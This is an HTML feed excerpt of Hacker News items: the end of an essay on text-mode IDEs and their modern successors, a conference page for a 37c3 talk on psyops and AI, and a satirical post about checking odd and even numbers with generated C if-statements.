https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd5155c1f-297e-4ce7-90b0-5d7e3db5384e_1264x948.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd5155c1f-297e-4ce7-90b0-5d7e3db5384e_1264x948.png" width="1264" height="948" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/d5155c1f-297e-4ce7-90b0-5d7e3db5384e_1264x948.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:948,&quot;width&quot;:1264,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:67977,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd5155c1f-297e-4ce7-90b0-5d7e3db5384e_1264x948.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd5155c1f-297e-4ce7-90b0-5d7e3db5384e_1264x948.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd5155c1f-297e-4ce7-90b0-5d7e3db5384e_1264x948.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd5155c1f-297e-4ce7-90b0-5d7e3db5384e_1264x948.png 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption>The RHIDE IDE showing the same "hello world" program as before, with no errors nor warnings after compilation.</figcaption></figure></div><p><span>Then we have </span><a href="https://www.freepascal.org/" rel="">Free Pascal</a><span>. This is the closest you’ll get to the old experience but with a modern codebase, running natively on Unix systems and leveraging terminals of any size.</span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6437dfa3-051a-4573-9db9-8f7b8f90d210_973x650.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6437dfa3-051a-4573-9db9-8f7b8f90d210_973x650.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6437dfa3-051a-4573-9db9-8f7b8f90d210_973x650.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6437dfa3-051a-4573-9db9-8f7b8f90d210_973x650.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6437dfa3-051a-4573-9db9-8f7b8f90d210_973x650.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6437dfa3-051a-4573-9db9-8f7b8f90d210_973x650.png" width="973" height="650" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/6437dfa3-051a-4573-9db9-8f7b8f90d210_973x650.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:650,&quot;width&quot;:973,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:118496,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6437dfa3-051a-4573-9db9-8f7b8f90d210_973x650.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6437dfa3-051a-4573-9db9-8f7b8f90d210_973x650.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6437dfa3-051a-4573-9db9-8f7b8f90d210_973x650.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6437dfa3-051a-4573-9db9-8f7b8f90d210_973x650.png 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption>The Free Pascal IDE with a trivial "hello world" program and overlapping windows for a built-in ASCII table and a calculator.</figcaption></figure></div><p><span>And lastly we have </span><a href="https://qb64.com/" rel="">QB64</a><span>. This closely resembles Microsoft QuickBasic but… don’t let it trick you: even though it looks like a TUI, it is actually a GUI application that simulates a TUI. You cannot run QB64 in a terminal.</span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbba1c191-c757-4684-a90d-2ca478210bc0_1360x700.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbba1c191-c757-4684-a90d-2ca478210bc0_1360x700.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbba1c191-c757-4684-a90d-2ca478210bc0_1360x700.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbba1c191-c757-4684-a90d-2ca478210bc0_1360x700.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbba1c191-c757-4684-a90d-2ca478210bc0_1360x700.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbba1c191-c757-4684-a90d-2ca478210bc0_1360x700.png" width="1360" height="700" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/bba1c191-c757-4684-a90d-2ca478210bc0_1360x700.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:700,&quot;width&quot;:1360,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:25786,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbba1c191-c757-4684-a90d-2ca478210bc0_1360x700.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbba1c191-c757-4684-a90d-2ca478210bc0_1360x700.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbba1c191-c757-4684-a90d-2ca478210bc0_1360x700.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbba1c191-c757-4684-a90d-2ca478210bc0_1360x700.png 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption>The QB64 IDE, which looks textual but is actually a graphical program.</figcaption></figure></div><p>Both Free Pascal and QB64 are maintained and under relatively-active development, with their most recent releases in 2021… but they are mostly ignored because they expose arcane languages that most people have no interest in these days.</p><p><span>So what are we left with for </span><em>modern</em><span> languages today?</span></p><p><span>The state of the art seems to be </span><a href="https://neovim.io/" rel="">Neovim</a><span>, </span><a href="https://github.com/doomemacs/doomemacs" rel="">Doom Emacs</a><span>, or even </span><a href="https://helix-editor.com/" rel="">Helix</a><span>. These editors are very powerful and, thanks to various plugins, offer reasonable IDE-like experiences. That said, if you ask me, none of these provide the same kind of experience that the previous Borland products offered: their interfaces are obscure and, due to their multi-language nature, they work OK for almost everything but they aren’t great for anything. “Jack of all trades, master of none” if you will.</span></p><p><span>In any case, the preferred “simple” TUI editor, based on what I observed in the deranged </span><a href="https://github.com/microsoft/terminal/discussions/16440" rel="">microsoft/terminal#16440</a><span> discussion, seems to be… </span><a href="https://www.nano-editor.org/" rel="">GNU Nano</a><span>… which OK, it works, but first: it’s no IDE, and second, to me this looks like WordStar. Yeah, I know it isn’t WordStar: if you want WordStar, the closest you’ll find is </span><a href="https://joe-editor.sourceforge.io/" rel="">Joe</a><span>, but the </span><em>looks</em><span> of Nano remind me of my first experiences with a word processor back in the CP/M days. Here, look:</span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6c498b8d-bc35-454d-a482-59acd08fda7a_973x650.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6c498b8d-bc35-454d-a482-59acd08fda7a_973x650.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6c498b8d-bc35-454d-a482-59acd08fda7a_973x650.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6c498b8d-bc35-454d-a482-59acd08fda7a_973x650.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6c498b8d-bc35-454d-a482-59acd08fda7a_973x650.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6c498b8d-bc35-454d-a482-59acd08fda7a_973x650.png" width="973" height="650" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/6c498b8d-bc35-454d-a482-59acd08fda7a_973x650.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:650,&quot;width&quot;:973,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:29129,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6c498b8d-bc35-454d-a482-59acd08fda7a_973x650.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6c498b8d-bc35-454d-a482-59acd08fda7a_973x650.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6c498b8d-bc35-454d-a482-59acd08fda7a_973x650.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6c498b8d-bc35-454d-a482-59acd08fda7a_973x650.png 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption>The GNU Nano editor in its default setup, with an empty file open.</figcaption></figure></div><p><span>So even though we </span><em>do</em><span> have powerful console editors these days, they don’t quite offer the same usable experience we had 30 years ago. In fact, it feels like during these 30 years, we regressed in many ways, and only now are reaching feature parity with some of the features we used to have.</span></p><p><span>It is natural that TUIs diminished in popularity once graphical OSes gained traction, and it is somewhat interesting that they are making a comeback just now. As for why, I think we have to thank the invention of </span><a href="https://microsoft.github.io/language-server-protocol/" rel="">LSP</a><span> for most of the recent progress in this area. TUI editors were “on hold” for many years because building IDE features for them was a lot of effort and their small maintainer base could not afford to implement them. LSP unlocked access to existing language-specific integrations and reinfused interest in the old-and-trusty Vim and Emacs. Hopefully, the upcoming </span><a href="https://build-server-protocol.github.io/" rel="">BSP</a><span> will do even more to make these TUIs more IDE-like.</span></p><p>It is fair to ask “Who cares? Every desktop and laptop runs a graphical OS now!”</p><p><span>And it’s a good question. In general, you probably </span><em>don’t</em><span> want a TUI IDE. If VSCode is your jam, its remoting abilities are superb and VSCode has a reasonably good graphical interface without being a full-blown IDE. But there are a few things that VSCode doesn’t give us.</span></p><p><span>The first is that a TUI IDE is excellent for work on remote machines—even better than VSCode. You can SSH into </span><em>any</em><span> machine with ease and launch the IDE. </span><a href="https://jmmv.dev/2015/09/my-coding-workflow.html" rel="">Combine it with tmux and you get “full” multitasking.</a><span> Yes, you could instead use a remote desktop client instead of SSH, but I’ve always found them clunky due to lag and the improper integration with the local desktop shortcuts.</span></p><p><span>The second is that </span><a href="https://code.visualstudio.com/docs/remote/faq#_why-arent-the-remote-development-extensions-or-their-components-open-source" rel="">VSCode’s remote extensions are </a><em><a href="https://code.visualstudio.com/docs/remote/faq#_why-arent-the-remote-development-extensions-or-their-components-open-source" rel="">not</a></em><a href="https://code.visualstudio.com/docs/remote/faq#_why-arent-the-remote-development-extensions-or-their-components-open-source" rel=""> open source</a><span>, which isn’t a major problem… except for the fact that they don’t work on, say, FreeBSD and there is no way to fix them. So this makes it impossible for me to remote into my primary development server with VSCode.</span></p><p>And the third is… reduced resource consumption.</p><p>I can’t leave without ranting about “bloat” for a little bit. Borland Turbo C++, with all its bells and whistles (the UI, the C++ toolchain, the integrated manuals…), is less than 9 MB after installation and ran within 640kb of RAM.</p><p>For comparison, Helix is 16 MB on disk, which is pretty impressive (and honestly unexpected), but Doom Emacs is about 500 MBs and consumes many MBs of RAM. Note, however, that none of these numbers account for the language toolchains or help systems, and toolchains nowadays rank in the GBs of disk space.</p><p>To get “real” IDEs, we have to jump to graphical programs like IntelliJ or VSCode. VSCode, for example, is about 350 MBs on disk (surprisingly less than Doom Emacs) but it will eat your computer for lunch: it’s Electron after all. I have noticed very significant savings in laptop battery life by dropping VSCode and moving to Doom Emacs.</p><p><span>So the question I want to part with is: have we advanced </span><em>much</em><span> in 30 years? Modern IDEs have some better refactoring tools, better features, and support more languages, but fundamentally… they haven’t changed much. The only major difference that we are </span><em>starting</em><span> to see might be AI-assisted coding, but this is a feature mostly provided by a remote service, not even by the installed code!</span></p><p><span>And that’s all for today. On my side, I’ll happily continue using </span><em>all of</em><span> Doom Emacs, Vim, VSCode, and IntelliJ depending on the situation. Merry Christmas if this is your thing!</span></p></div></article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[You've just been fucked by psyops [video] (229 pts)]]></title>
            <link>https://media.ccc.de/v/37c3-12326-you_ve_just_been_fucked_by_psyops</link>
            <guid>38791575</guid>
            <pubDate>Thu, 28 Dec 2023 09:17:46 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://media.ccc.de/v/37c3-12326-you_ve_just_been_fucked_by_psyops">https://media.ccc.de/v/37c3-12326-you_ve_just_been_fucked_by_psyops</a>, See on <a href="https://news.ycombinator.com/item?id=38791575">Hacker News</a></p>
<div id="readability-page-1" class="page">

<div>
<ol>
<li>
<a href="https://media.ccc.de/b">
browse
</a>
</li>
<li>
<span></span>
<a href="https://media.ccc.de/b/congress">
congress
</a>
</li>
<li>
<span></span>
<a href="https://media.ccc.de/b/congress/2023">
2023
</a>
</li>
<li>
<span></span>
event
</li>
</ol>
</div>

<div>

<p>
<span></span>
<a href="https://media.ccc.de/search?p=Trevor+Paglen">Trevor Paglen</a>

</p>

<p><a href="https://media.ccc.de/c/37c3/" rel="tag"></a>
<a href="https://media.ccc.de/c/37c3/Art%20&amp;%20Beauty" rel="tag">Art &amp; Beauty</a>
Playlists:
<a href="https://media.ccc.de/v/37c3-12326-you_ve_just_been_fucked_by_psyops/playlist">'37c3' videos starting here</a>
/
<a data-method="get" href="https://media.ccc.de/v/37c3-12326-you_ve_just_been_fucked_by_psyops/audio">audio</a></p>
<!-- %h3 About -->
<p>How the history of military and government PSYOPS involving mind-control, UFOs, magic, and remote-control zombies, explains the future of AI and generative media. Along the way, talk attendees will be given an enrollment code to join a specialized CTF/ARG game called CYCLOPS that explores these themes and that will run the duration of Congress. </p>

<p>As AI-generated content, social-media influence operations, micro-targeted advertising, and ubiquitous surveillance have become the norm on the Internet and in the market in general, we have entered an era of PSYOP Capitalism. This is an era of hallucinations designed to transform each of us into a “targeted individual” through the manipulation of perception. This talk explores a secret history of reality-altering military and intelligence programs that serve as antecedents to a phantasmagoric present.</p>

<p>At the talk, attendees will be given a registration code to play “CYCLOPS,” a CTF/ARG game that will run the duration of Congress. CYCLOPS explores the themes of the mind-control and PSYOPS through an interactive parafictional narrative taking place in the context of an obscure CIA cognitive warfare program from the early days of the Cold War.
</p>

<h3>Download</h3>
<div>

<div>
<h4>These files contain multiple languages.</h4>
<p>
This Talk was translated into multiple languages. The files available
for download contain all languages as separate audio-tracks. Most
desktop video players allow you to choose between them.
</p>
<p>
Please look for "audio tracks" in your desktop video player.
</p>
</div>
<div>
<p>
<h4>Subtitles</h4>
</p>

</div>
<div>
<p>
<h4>Audio</h4>
</p>

</div>
</div>
<!-- %h3 Embed/Share -->

<h3>Tags</h3>

</div>





</div>]]></description>
        </item>
        <item>
            <title><![CDATA[4B If Statements (737 pts)]]></title>
            <link>https://andreasjhkarlsson.github.io//jekyll/update/2023/12/27/4-billion-if-statements.html</link>
            <guid>38790597</guid>
            <pubDate>Thu, 28 Dec 2023 06:11:31 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://andreasjhkarlsson.github.io//jekyll/update/2023/12/27/4-billion-if-statements.html">https://andreasjhkarlsson.github.io//jekyll/update/2023/12/27/4-billion-if-statements.html</a>, See on <a href="https://news.ycombinator.com/item?id=38790597">Hacker News</a></p>
<div id="readability-page-1" class="page"><div aria-label="Content">
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>I recently stumbled upon this screenshot while researching social media on the train. Of course, it was followed by a cascade of spiteful comments, criticizing this fresh programmer’s attempt to solve a classical problem in computer science. The modulus operation.</p>

<p><img src="https://andreasjhkarlsson.github.io/assets/images/GCPVDa1WYAAoBut.jpg" alt="TikTok screenshot" width="250"></p>

<p>Now, in a world where AI is replacing programmers by the minute, taking their jobs and revolutionizing the way we think about code, maybe we should be more open to the thoughts of the fresh new blood of the industry? In fact, the above code is a perfect example of a time-memory tradeoff. You’re trading off your time and at the same time, the computers memory and time as well! Truly a marvelous algorithm!</p>

<p>So I went to work to explore this idea of checking if a number is odd or even by only using comparisons to see how well it works in a real world scenario. Since I’m a great believer in performant code I decided to implement this in the C programming language as it’s by far the fastest language on the planet to this day (thanks to the visionary genius Dennis Richie).</p>

<p>So I started composing</p>

<figure><pre><code data-lang="c"><span>/* Copyright 2023. All unauthorized distribution of this source code 
   will be persecuted to the fullest extent of the law*/</span>
<span>#include &lt;stdio.h&gt;
#include &lt;stdint.h&gt;
#include &lt;stdlib.h&gt;
</span><span>int</span> <span>main</span><span>(</span><span>int</span> <span>argc</span><span>,</span> <span>char</span><span>*</span> <span>argv</span><span>[])</span>
<span>{</span>
    <span>uint8_t</span> <span>number</span> <span>=</span> <span>atoi</span><span>(</span><span>argv</span><span>[</span><span>1</span><span>]);</span> <span>// No problems here</span>
    <span>if</span> <span>(</span><span>number</span> <span>==</span> <span>0</span><span>)</span>
        <span>printf</span><span>(</span><span>"even</span><span>\n</span><span>"</span><span>);</span>
    <span>if</span> <span>(</span><span>number</span> <span>==</span> <span>1</span><span>)</span>
        <span>printf</span><span>(</span><span>"odd</span><span>\n</span><span>"</span><span>);</span>
    <span>if</span> <span>(</span><span>number</span> <span>==</span> <span>2</span><span>)</span>
        <span>printf</span><span>(</span><span>"even</span><span>\n</span><span>"</span><span>);</span>
    <span>if</span> <span>(</span><span>number</span> <span>==</span> <span>3</span><span>)</span>
        <span>printf</span><span>(</span><span>"odd</span><span>\n</span><span>"</span><span>);</span>
    <span>if</span> <span>(</span><span>number</span> <span>==</span> <span>4</span><span>)</span>
        <span>printf</span><span>(</span><span>"even</span><span>\n</span><span>"</span><span>);</span>
    <span>if</span> <span>(</span><span>number</span> <span>==</span> <span>5</span><span>)</span>
        <span>printf</span><span>(</span><span>"odd</span><span>\n</span><span>"</span><span>);</span>
    <span>if</span> <span>(</span><span>number</span> <span>==</span> <span>6</span><span>)</span>
        <span>printf</span><span>(</span><span>"even</span><span>\n</span><span>"</span><span>);</span>
    <span>if</span> <span>(</span><span>number</span> <span>==</span> <span>7</span><span>)</span>
        <span>printf</span><span>(</span><span>"odd</span><span>\n</span><span>"</span><span>);</span>
    <span>if</span> <span>(</span><span>number</span> <span>==</span> <span>8</span><span>)</span>
        <span>printf</span><span>(</span><span>"even</span><span>\n</span><span>"</span><span>);</span>
    <span>if</span> <span>(</span><span>number</span> <span>==</span> <span>9</span><span>)</span>
        <span>printf</span><span>(</span><span>"odd</span><span>\n</span><span>"</span><span>);</span>
    <span>if</span> <span>(</span><span>number</span> <span>==</span> <span>10</span><span>)</span>
        <span>printf</span><span>(</span><span>"even</span><span>\n</span><span>"</span><span>);</span>
<span>}</span></code></pre></figure>

<p>Beautiful! Lets compile the code, disabling optimizations with /Od to make sure that the pesky compiler doesn’t interfere with our algorithm. After compiling we can do a quick test of the program we get some positive results:</p>

<figure><pre><code data-lang="powershell"><span>PS</span><span> </span><span>&gt;</span><span> </span><span>cl.exe</span><span> </span><span>/Od</span><span> </span><span>program.c</span><span>
</span><span>PS</span><span> </span><span>&gt;</span><span> </span><span>.</span><span>\program.exe</span><span> </span><span>0</span><span> 
</span><span>even</span><span>
</span><span>PS</span><span> </span><span>&gt;</span><span> </span><span>.</span><span>\program.exe</span><span> </span><span>4</span><span>
</span><span>even</span><span>
</span><span>PS</span><span> </span><span>&gt;</span><span> </span><span>.</span><span>\program.exe</span><span> </span><span>3</span><span>
</span><span>odd</span><span>
</span><span>PS</span><span> </span><span>&gt;</span><span> </span><span>.</span><span>\program.exe</span><span> </span><span>7</span><span>
</span><span>odd</span></code></pre></figure>

<p>However, after doing some further testing I found some problems:</p>

<figure><pre><code data-lang="powershell"><span>PS</span><span> </span><span>&gt;</span><span> </span><span>.</span><span>\program.exe</span><span> </span><span>50</span><span>
</span><span>PS</span><span> </span><span>&gt;</span><span> </span><span>.</span><span>\program.exe</span><span> </span><span>11</span><span>
</span><span>PS</span><span> </span><span>&gt;</span><span> </span><span>.</span><span>\program.exe</span><span> </span><span>99</span></code></pre></figure>

<p>No output! It seems that the program only works for numbers under 11! Going back to the code we can find the issue right after the last if statement, we need more if statements!</p>

<p>Now, this is a time-memory tradeoff, but my time on this earth is limited so I decided to meta-program the if statements using a programmer program in a different programming language. To compensate for this cheating I decided to use the slowest language on the planet, Python (thanks to the visionary genius of Ross van der Gussom).</p>

<figure><pre><code data-lang="python"><span>print</span><span>(</span><span>"/* Copyright 2023. All unauthorized distribution of this source code"</span><span>)</span>
<span>print</span><span>(</span><span>"   will be persecuted to the fullest extent of the law*/"</span><span>)</span>

<span>print</span><span>(</span><span>"#include &lt;stdio.h&gt;"</span><span>)</span>
<span>print</span><span>(</span><span>"#include &lt;stdint.h&gt;"</span><span>)</span>
<span>print</span><span>(</span><span>"#include &lt;stdlib.h&gt;"</span><span>)</span>

<span>print</span><span>(</span><span>"int main(int argc, char* argv[])"</span><span>)</span>
<span>print</span><span>(</span><span>"{"</span><span>)</span>
<span>print</span><span>(</span><span>"    uint8_t number = atoi(argv[1]); // No problems here"</span><span>)</span>

<span>for</span> <span>i</span> <span>in</span> <span>range</span><span>(</span><span>2</span><span>**</span><span>8</span><span>):</span>
    <span>print</span><span>(</span><span>"    if (number == "</span><span>+</span><span>str</span><span>(</span><span>i</span><span>)</span><span>+</span><span>")"</span><span>)</span>
    <span>if</span> <span>i</span> <span>%</span> <span>2</span> <span>==</span> <span>0</span><span>:</span>
        <span>print</span><span>(</span><span>"        printf(</span><span>\"</span><span>even</span><span>\\</span><span>n</span><span>\"</span><span>);"</span><span>)</span>
    <span>else</span><span>:</span>
        <span>print</span><span>(</span><span>"        printf(</span><span>\"</span><span>odd</span><span>\\</span><span>n</span><span>\"</span><span>);"</span><span>)</span>

<span>print</span><span>(</span><span>"}"</span><span>)</span></code></pre></figure>

<p>Nice! Now we can generate a program that solves the even-odd problem for all 8-bit integers!</p>

<figure><pre><code data-lang="powershell"><span>PS</span><span> </span><span>&gt;</span><span> </span><span>python</span><span> </span><span>programmer.py</span><span> </span><span>&gt;</span><span> </span><span>program.c</span><span>
</span><span>PS</span><span> </span><span>&gt;</span><span> </span><span>cl.exe</span><span> </span><span>/Od</span><span> </span><span>program.c</span><span>
</span><span>PS</span><span> </span><span>&gt;</span><span> </span><span>.</span><span>\program.exe</span><span> </span><span>99</span><span>
</span><span>odd</span><span>
</span><span>PS</span><span> </span><span>&gt;</span><span> </span><span>.</span><span>\program.exe</span><span> </span><span>50</span><span>
</span><span>even</span><span>
</span><span>PS</span><span> </span><span>&gt;</span><span> </span><span>.</span><span>\program.exe</span><span> </span><span>240</span><span>
</span><span>even</span><span>
</span><span>PS</span><span> </span><span>&gt;</span><span> </span><span>.</span><span>\program.exe</span><span> </span><span>241</span><span>
</span><span>odd</span></code></pre></figure>

<p>Would you look at that! It works flawlessly! Now, let’s scale it up to 16 bit!</p>

<figure><pre><code data-lang="python"><span>print</span><span>(</span><span>"    uint16_t number = atoi(argv[1]); // No problems here"</span><span>)</span>
<span>…</span>
<span>for</span> <span>i</span> <span>in</span> <span>range</span><span>(</span><span>2</span><span>**</span><span>16</span><span>):</span></code></pre></figure>

<p>This gives a nice and thick c file of around 130k lines. Nothing really when looking back at some of the code bases I’ve worked on over the years. Let’s compile!</p>

<figure><pre><code data-lang="powershell"><span>PS</span><span> </span><span>&gt;</span><span> </span><span>python</span><span> </span><span>programmer.py</span><span> </span><span>&gt;</span><span> </span><span>program.c</span><span>
</span><span>PS</span><span> </span><span>&gt;</span><span> </span><span>cl.exe</span><span> </span><span>/Od</span><span> </span><span>program.c</span><span>
</span><span>PS</span><span> </span><span>&gt;</span><span> </span><span>.</span><span>\program.exe</span><span> </span><span>21000</span><span>
</span><span>even</span><span>
</span><span>PS</span><span> </span><span>&gt;</span><span> </span><span>.</span><span>\program.exe</span><span> </span><span>3475</span><span> 
</span><span>odd</span><span>
</span><span>PS</span><span> </span><span>&gt;</span><span> </span><span>.</span><span>\program.exe</span><span> </span><span>3</span><span>   
</span><span>odd</span><span>
</span><span>PS</span><span> </span><span>&gt;</span><span> </span><span>.</span><span>\program.exe</span><span> </span><span>65001</span><span>
</span><span>odd</span><span>
</span><span>PS</span><span> </span><span>&gt;</span><span> </span><span>.</span><span>\program.exe</span><span> </span><span>65532</span><span>
</span><span>even</span></code></pre></figure>

